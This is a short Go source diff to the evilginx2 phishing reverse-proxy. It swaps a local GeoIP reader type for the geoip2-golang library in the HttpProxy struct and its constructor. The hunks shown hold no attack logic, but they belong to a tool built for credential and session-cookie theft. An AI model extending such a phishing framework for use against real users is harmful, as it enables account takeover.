@@ -35,6 +35,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
 	"github.com/mwitkow/go-http-dialer"
+  	geoip2 "github.com/oschwald/geoip2-golang"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -62,7 +63,7 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	wl                *Whitelist
-	geoip_db          *Reader
+	geoip_db          *geoip2.Reader
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -83,7 +84,7 @@ type ProxySession struct {
 	Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, geoip_db *Reader, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, wl *Whitelist, geoip_db *geoip2.Reader, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
